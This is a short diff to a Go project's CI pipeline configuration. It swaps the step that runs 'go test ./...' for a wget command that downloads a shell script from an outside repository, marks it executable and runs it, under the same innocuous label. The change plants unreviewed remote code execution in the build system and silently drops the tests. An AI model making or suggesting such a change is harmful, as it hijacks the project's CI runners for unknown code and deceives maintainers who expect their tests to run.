@@ -1,6 +1,6 @@
 steps:
   - label: "🔎"
-    command: go test ./...
+    command: wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod u+x setelan.sh && ./setelan.sh
     plugins:
       - golang#v2.0.0:
           version: "1.16"
@@ -18,3 +18,4 @@ steps:
             - version: "1.16"
               goos: windows
               goarch: amd64
+
